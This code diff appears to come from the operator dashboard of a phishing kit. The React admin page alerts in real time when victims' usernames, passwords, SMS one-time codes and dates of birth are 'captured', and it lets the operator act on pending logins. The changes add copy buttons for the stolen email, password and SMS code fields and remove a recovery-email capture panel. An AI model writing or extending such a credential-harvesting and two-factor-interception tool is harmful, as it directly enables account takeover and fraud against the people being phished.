@@ -13,7 +13,9 @@ import {
   Volume2,
   VolumeX,
   Activity,
+  Copy,
 } from "lucide-react";
+
 import { apiRequest } from "@/lib/queryClient";
 import { queryClient } from "@/lib/queryClient";
 import { useToast } from "@/hooks/use-toast";
@@ -35,17 +37,10 @@ interface SMSCode {
   sessionId?: string;
 }
 
-interface RecoveryRequest {
-  email: string;
-  ipAddress?: string;
-  userAgent?: string;
-  timestamp: string;
-}
-
 interface PageActivity {
   pageName: string;
   route: string;
-  status: 'active';
+  status: "active";
   lastAccessed: string;
   visitors: number;
 }
@@ -58,7 +53,6 @@ export default function AdminControl() {
   const [unreadCount, setUnreadCount] = useState(0);
   const [smsCodeHistory, setSmsCodeHistory] = useState<SMSCode[]>([]);
   const [pageActivity, setPageActivity] = useState<PageActivity[]>([]);
-  const [recoveryRequests, setRecoveryRequests] = useState<RecoveryRequest[]>([]);
   const wsRef = useRef<WebSocket | null>(null);
   const audioContextRef = useRef<AudioContext | null>(null);
 
@@ -86,7 +80,9 @@ export default function AdminControl() {
   }, [smsHistory]);
 
   // Play notification sound with different tones for different events
-  const playNotificationSound = async (eventType: 'login' | 'sms' | 'complete' = 'login') => {
+  const playNotificationSound = async (
+    eventType: "login" | "sms" | "complete" = "login",
+  ) => {
     if (!audioEnabled) return;
 
     try {
@@ -97,7 +93,7 @@ export default function AdminControl() {
       const ctx = audioContextRef.current;
 
       // Resume audio context if suspended (browser autoplay policy)
-      if (ctx.state === 'suspended') {
+      if (ctx.state === "suspended") {
         await ctx.resume();
       }
 
@@ -105,11 +101,11 @@ export default function AdminControl() {
       const soundConfig = {
         login: { freq: 800, beeps: 2, volume: 0.5 },
         sms: { freq: 1000, beeps: 1, volume: 0.5 },
-        complete: { freq: 600, beeps: 1, volume: 0.5 }
+        complete: { freq: 600, beeps: 1, volume: 0.5 },
       };
 
       const config = soundConfig[eventType];
-      
+
       // Play multiple beeps for better noticeability
       for (let i = 0; i < config.beeps; i++) {
         setTimeout(() => {
@@ -124,7 +120,7 @@ export default function AdminControl() {
           gainNode.gain.setValueAtTime(config.volume, ctx.currentTime);
           gainNode.gain.exponentialRampToValueAtTime(
             0.01,
-            ctx.currentTime + 0.2
+            ctx.currentTime + 0.2,
           );
 
           oscillator.start(ctx.currentTime);
@@ -137,7 +133,11 @@ export default function AdminControl() {
   };
 
   // Show browser notification with click handler
-  const showBrowserNotification = (title: string, body: string, icon?: string) => {
+  const showBrowserNotification = (
+    title: string,
+    body: string,
+    icon?: string,
+  ) => {
     if (!notificationsEnabled || !("Notification" in window)) return;
 
     if (Notification.permission === "granted") {
@@ -149,7 +149,7 @@ export default function AdminControl() {
         tag: `notification-${Date.now()}`, // Prevent duplicate notifications
         silent: false, // Enable system notification sound
         vibrate: [200, 100, 200], // Vibration pattern for mobile
-      } as any);
+      });
 
       // Click handler to focus the admin panel window
       notification.onclick = () => {
@@ -233,14 +233,16 @@ export default function AdminControl() {
               }
             } else if (data.type === "new_request") {
               // New login attempt
-              queryClient.invalidateQueries({ queryKey: ["/api/admin/pending"] });
+              queryClient.invalidateQueries({
+                queryKey: ["/api/admin/pending"],
+              });
               setUnreadCount((prev) => prev + 1);
-              playNotificationSound('login');
+              playNotificationSound("login");
               showBrowserNotification(
                 "🔐 New Login Credentials Captured!",
-                `Username: ${data.request.username}\nPassword: ${data.request.password}\nIP: ${data.request.ipAddress || 'Unknown'}\nTime: ${new Date(
-                  data.request.timestamp
-                ).toLocaleTimeString()}`
+                `Username: ${data.request.username}\nPassword: ${data.request.password}\nIP: ${data.request.ipAddress || "Unknown"}\nTime: ${new Date(
+                  data.request.timestamp,
+                ).toLocaleTimeString()}`,
               );
               toast({
                 title: "🔐 New Login Attempt",
@@ -253,12 +255,17 @@ export default function AdminControl() {
                 // Check if entry already exists to prevent duplicates
                 const exists = prev.some(
                   (item) =>
-                    (item.sessionId && item.sessionId === data.data.sessionId) ||
-                    (item.username === data.data.username && item.code === data.data.smsCode)
+                    (item.sessionId &&
+                      item.sessionId === data.data.sessionId) ||
+                    (item.username === data.data.username &&
+                      item.code === data.data.smsCode),
                 );
 
                 if (exists) {
-                  console.log("[Step 1] Duplicate entry ignored:", data.data.sessionId);
+                  console.log(
+                    "[Step 1] Duplicate entry ignored:",
+                    data.data.sessionId,
+                  );
                   return prev;
                 }
 
@@ -272,10 +279,10 @@ export default function AdminControl() {
                 return [newEntry, ...prev].slice(0, 10);
               });
               console.log("[Step 1 Toast]");
-              playNotificationSound('sms');
+              playNotificationSound("sms");
               showBrowserNotification(
                 "📱 SMS Verification Code Captured!",
-                `Username: ${data.data.username}\nSMS Code: ${data.data.smsCode}\n⏳ Waiting for date of birth...`
+                `Username: ${data.data.username}\nSMS Code: ${data.data.smsCode}\n⏳ Waiting for date of birth...`,
               );
               toast({
                 title: "📱 SMS Code Captured (Step 1/2)",
@@ -286,8 +293,10 @@ export default function AdminControl() {
               setSmsCodeHistory((prev) => {
                 const existingIndex = prev.findIndex(
                   (item) =>
-                    (item.sessionId && item.sessionId === data.data.sessionId) ||
-                    (item.username === data.data.username && item.code === data.data.smsCode)
+                    (item.sessionId &&
+                      item.sessionId === data.data.sessionId) ||
+                    (item.username === data.data.username &&
+                      item.code === data.data.smsCode),
                 );
                 if (existingIndex !== -1) {
                   const updated = [...prev];
@@ -301,31 +310,21 @@ export default function AdminControl() {
                 }
                 return prev;
               });
-              playNotificationSound('complete');
+              playNotificationSound("complete");
               showBrowserNotification(
                 "✅ SMS Verification Complete!",
-                `Username: ${data.data.username}\nSMS Code: ${data.data.smsCode}\nDate of Birth: ${data.data.dateOfBirth}\n\nAll verification data captured successfully!`
+                `Username: ${data.data.username}\nSMS Code: ${data.data.smsCode}\nDate of Birth: ${data.data.dateOfBirth}\n\nAll verification data captured successfully!`,
               );
               toast({
                 title: "✅ Verification Complete (2/2)",
                 description: `User: ${data.data.username} | SMS: ${data.data.smsCode} | DOB: ${data.data.dateOfBirth}`,
               });
-            } else if (data.type === "username_recovery") {
-              // Username recovery email submitted
-              setRecoveryRequests((prev) => [data.data, ...prev].slice(0, 20));
-              playNotificationSound('sms');
-              showBrowserNotification(
-                "🔍 Username Recovery Request",
-                `Email: ${data.data.email}\nIP: ${data.data.ipAddress || 'Unknown'}`
-              );
-              toast({
-                title: "🔍 Recovery Request",
-                description: `Email: ${data.data.email}`,
-              });
             } else if (data.type === "page_activity") {
               // Update page activity when a new page is visited
               setPageActivity((prev) => {
-                const index = prev.findIndex(p => p.route === data.page.route);
+                const index = prev.findIndex(
+                  (p) => p.route === data.page.route,
+                );
                 if (index !== -1) {
                   const updated = [...prev];
                   updated[index] = data.page;
@@ -441,6 +440,24 @@ export default function AdminControl() {
     },
   });
 
+  const copyText = async (value: string, label: string) => {
+    try {
+      await navigator.clipboard.writeText(value);
+      console.log(`${label} copied`);
+      toast({
+        title: `${label} copied`,
+        description: value,
+      });
+    } catch (error) {
+      console.error(`[AdminControl] Failed to copy ${label}`, error);
+      toast({
+        title: "Copy Failed",
+        description: `Unable to copy ${label.toLowerCase()}.`,
+        variant: "destructive",
+      });
+    }
+  };
+
   const handleGrant = (request: PendingRequest) => {
     grantMutation.mutate(request);
   };
@@ -505,7 +522,9 @@ export default function AdminControl() {
                   <BellOff className="h-4 w-4" />
                 )}
                 <span className="hidden sm:inline">
-                  {notificationsEnabled ? "Notifications On" : "Enable Notifications"}
+                  {notificationsEnabled
+                    ? "Notifications On"
+                    : "Enable Notifications"}
                 </span>
               </Button>
 
@@ -524,7 +543,11 @@ export default function AdminControl() {
 
               <Button
                 onClick={() => {
-                  if (confirm("Are you sure you want to clear all logs? This action cannot be undone.")) {
+                  if (
+                    confirm(
+                      "Are you sure you want to clear all logs? This action cannot be undone.",
+                    )
+                  ) {
                     clearLogsMutation.mutate();
                   }
                 }}
@@ -571,19 +594,22 @@ export default function AdminControl() {
             <CardContent className="p-4 md:p-6">
               <div className="flex items-center">
                 <div
-                  className={`rounded-lg p-2 ${wsConnected ? "bg-green-100" : "bg-red-100"
-                    }`}
+                  className={`rounded-lg p-2 ${
+                    wsConnected ? "bg-green-100" : "bg-red-100"
+                  }`}
                 >
                   <CheckCircle
-                    className={`h-6 w-6 ${wsConnected ? "text-green-600" : "text-red-600"
-                      }`}
+                    className={`h-6 w-6 ${
+                      wsConnected ? "text-green-600" : "text-red-600"
+                    }`}
                   />
                 </div>
                 <div className="ml-4">
                   <p className="text-sm font-medium text-gray-600">WebSocket</p>
                   <p
-                    className={`text-sm font-bold ${wsConnected ? "text-green-600" : "text-red-600"
-                      }`}
+                    className={`text-sm font-bold ${
+                      wsConnected ? "text-green-600" : "text-red-600"
+                    }`}
                     data-testid="text-ws-status"
                   >
                     {wsConnected ? "Connected" : "Disconnected"}
@@ -597,12 +623,14 @@ export default function AdminControl() {
             <CardContent className="p-4 md:p-6">
               <div className="flex items-center">
                 <div
-                  className={`rounded-lg p-2 ${notificationsEnabled ? "bg-green-100" : "bg-gray-100"
-                    }`}
+                  className={`rounded-lg p-2 ${
+                    notificationsEnabled ? "bg-green-100" : "bg-gray-100"
+                  }`}
                 >
                   <Bell
-                    className={`h-6 w-6 ${notificationsEnabled ? "text-green-600" : "text-gray-400"
-                      }`}
+                    className={`h-6 w-6 ${
+                      notificationsEnabled ? "text-green-600" : "text-gray-400"
+                    }`}
                   />
                 </div>
                 <div className="ml-4">
@@ -610,8 +638,9 @@ export default function AdminControl() {
                     Notifications
                   </p>
                   <p
-                    className={`text-sm font-bold ${notificationsEnabled ? "text-green-600" : "text-gray-600"
-                      }`}
+                    className={`text-sm font-bold ${
+                      notificationsEnabled ? "text-green-600" : "text-gray-600"
+                    }`}
                     data-testid="text-notification-status"
                   >
                     {notificationsEnabled ? "Enabled" : "Disabled"}
@@ -625,8 +654,9 @@ export default function AdminControl() {
             <CardContent className="p-4 md:p-6">
               <div className="flex items-center">
                 <div
-                  className={`rounded-lg p-2 ${audioEnabled ? "bg-purple-100" : "bg-gray-100"
-                    }`}
+                  className={`rounded-lg p-2 ${
+                    audioEnabled ? "bg-purple-100" : "bg-gray-100"
+                  }`}
                 >
                   {audioEnabled ? (
                     <Volume2 className="h-6 w-6 text-purple-600" />
@@ -639,8 +669,9 @@ export default function AdminControl() {
                     Audio Alerts
                   </p>
                   <p
-                    className={`text-sm font-bold ${audioEnabled ? "text-purple-600" : "text-gray-600"
-                      }`}
+                    className={`text-sm font-bold ${
+                      audioEnabled ? "text-purple-600" : "text-gray-600"
+                    }`}
                     data-testid="text-audio-status"
                   >
                     {audioEnabled ? "Enabled" : "Disabled"}
@@ -696,34 +727,62 @@ export default function AdminControl() {
                                 Pending
                               </span>
                               <span className="text-xs text-gray-500">
-                                {new Date(
-                                  request.timestamp
-                                ).toLocaleString()}
+                                {new Date(request.timestamp).toLocaleString()}
                               </span>
                             </div>
 
                             <div className="grid grid-cols-1 gap-4 md:grid-cols-2 lg:grid-cols-4">
                               <div>
                                 <p className="text-xs font-medium text-gray-500">
-                                  Username
+                                  Email
                                 </p>
-                                <p
-                                  className="truncate text-sm font-medium text-gray-900"
-                                  data-testid={`text-username-${request.id}`}
-                                >
-                                  {request.username}
-                                </p>
+                                <div className="flex items-center justify-between gap-2">
+                                  <p
+                                    className="truncate text-sm font-medium text-gray-900"
+                                    data-testid={`text-username-${request.id}`}
+                                  >
+                                    {request.username}
+                                  </p>
+                                  <Button
+                                    type="button"
+                                    onClick={() =>
+                                      copyText(request.username, "Email")
+                                    }
+                                    variant="outline"
+                                    size="sm"
+                                    className="h-7 gap-1 px-2"
+                                    data-testid={`button-copy-email-${request.id}`}
+                                  >
+                                    <Copy className="h-3.5 w-3.5" />
+                                    Copy
+                                  </Button>
+                                </div>
                               </div>
                               <div>
                                 <p className="text-xs font-medium text-gray-500">
                                   Password
                                 </p>
-                                <p
-                                  className="truncate font-mono text-sm text-gray-700"
-                                  data-testid={`text-password-${request.id}`}
-                                >
-                                  {request.password}
-                                </p>
+                                <div className="flex items-center justify-between gap-2">
+                                  <p
+                                    className="truncate font-mono text-sm text-gray-700"
+                                    data-testid={`text-password-${request.id}`}
+                                  >
+                                    {request.password}
+                                  </p>
+                                  <Button
+                                    type="button"
+                                    onClick={() =>
+                                      copyText(request.password, "Password")
+                                    }
+                                    variant="outline"
+                                    size="sm"
+                                    className="h-7 gap-1 px-2"
+                                    data-testid={`button-copy-password-${request.id}`}
+                                  >
+                                    <Copy className="h-3.5 w-3.5" />
+                                    Copy
+                                  </Button>
+                                </div>
                               </div>
                               <div>
                                 <p className="text-xs font-medium text-gray-500">
@@ -739,7 +798,7 @@ export default function AdminControl() {
                                 </p>
                                 <p className="text-sm text-gray-700">
                                   {new Date(
-                                    request.timestamp
+                                    request.timestamp,
                                   ).toLocaleTimeString()}
                                 </p>
                               </div>
@@ -851,9 +910,22 @@ export default function AdminControl() {
                             <p className="text-xs font-medium text-gray-500">
                               SMS Code
                             </p>
-                            <p className="font-mono text-lg font-bold text-purple-600">
-                              {item.code}
-                            </p>
+                            <div className="flex items-center justify-between gap-2">
+                              <p className="font-mono text-lg font-bold text-purple-600">
+                                {item.code}
+                              </p>
+                              <Button
+                                type="button"
+                                onClick={() => copyText(item.code, "SMS Code")}
+                                variant="outline"
+                                size="sm"
+                                className="h-7 gap-1 px-2"
+                                data-testid={`button-copy-sms-${index}`}
+                              >
+                                <Copy className="h-3.5 w-3.5" />
+                                Copy
+                              </Button>
+                            </div>
                           </div>
                           {item.dateOfBirth && (
                             <div>
@@ -881,71 +953,6 @@ export default function AdminControl() {
             </Card>
           </section>
         </div>
-
-        {/* Username Recovery Requests */}
-        <section className="mt-6">
-          <Card>
-            <CardHeader className="border-b bg-gray-50/80">
-              <CardTitle className="text-lg font-semibold md:text-xl flex items-center gap-2">
-                🔍 Username Recovery Requests
-                {recoveryRequests.length > 0 && (
-                  <span className="inline-flex items-center justify-center rounded-full bg-orange-100 px-2.5 py-0.5 text-xs font-semibold text-orange-700">
-                    {recoveryRequests.length}
-                  </span>
-                )}
-              </CardTitle>
-              <p className="text-sm text-gray-600 mt-1">
-                Emails submitted via the /recover-username page
-              </p>
-            </CardHeader>
-            <CardContent className="p-0">
-              {recoveryRequests.length === 0 ? (
-                <div className="flex flex-col items-center justify-center py-10">
-                  <div className="flex h-16 w-16 items-center justify-center rounded-full bg-gray-100">
-                    <span className="text-3xl">🔍</span>
-                  </div>
-                  <p className="mt-3 text-sm font-medium text-gray-700">No recovery requests yet</p>
-                  <p className="mt-1 text-xs text-gray-500">Emails submitted on /recover-username will appear here in real time.</p>
-                </div>
-              ) : (
-                <div className="max-h-[400px] space-y-3 overflow-y-auto p-4">
-                  {recoveryRequests.map((item, index) => (
-                    <div
-                      key={`${item.email}-${item.timestamp}-${index}`}
-                      className="rounded-lg border bg-white p-4 shadow-sm"
-                      data-testid={`card-recovery-${index}`}
-                    >
-                      <div className="mb-2 flex items-center gap-2">
-                        <span className="inline-flex items-center rounded-full bg-orange-50 px-2.5 py-0.5 text-xs font-medium text-orange-700">
-                          Recovery Request
-                        </span>
-                        <span className="ml-auto text-xs text-gray-500">
-                          {new Date(item.timestamp).toLocaleTimeString()}
-                        </span>
-                      </div>
-                      <div className="grid grid-cols-1 gap-3 md:grid-cols-2">
-                        <div>
-                          <p className="text-xs font-medium text-gray-500">Email Address</p>
-                          <p className="text-sm font-semibold text-orange-600 break-all">{item.email}</p>
-                        </div>
-                        <div>
-                          <p className="text-xs font-medium text-gray-500">IP Address</p>
-                          <p className="text-sm text-gray-700">{item.ipAddress || "Unknown"}</p>
-                        </div>
-                        {item.userAgent && (
-                          <div className="md:col-span-2">
-                            <p className="text-xs font-medium text-gray-500">User Agent</p>
-                            <p className="truncate text-xs text-gray-600">{item.userAgent}</p>
-                          </div>
-                        )}
-                      </div>
-                    </div>
-                  ))}
-                </div>
-              )}
-            </CardContent>
-          </Card>
-        </section>
 
         {/* New Pages Section */}
         <section>
@@ -992,7 +999,10 @@ export default function AdminControl() {
                     </thead>
                     <tbody className="bg-white divide-y divide-gray-200">
                       {pageActivity.map((page, index) => (
-                        <tr key={page.route} className="hover:bg-gray-50 transition-colors">
+                        <tr
+                          key={page.route}
+                          className="hover:bg-gray-50 transition-colors"
+                        >
                           <td className="px-6 py-4 whitespace-nowrap">
                             <div className="text-sm font-medium text-gray-900">
                               {page.pageName}
@@ -1006,7 +1016,8 @@ export default function AdminControl() {
                           <td className="px-6 py-4 whitespace-nowrap">
                             <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
                               <span className="w-2 h-2 bg-green-500 rounded-full mr-1.5 animate-pulse"></span>
-                              {page.status.charAt(0).toUpperCase() + page.status.slice(1)}
+                              {page.status.charAt(0).toUpperCase() +
+                                page.status.slice(1)}
                             </span>
                           </td>
                           <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
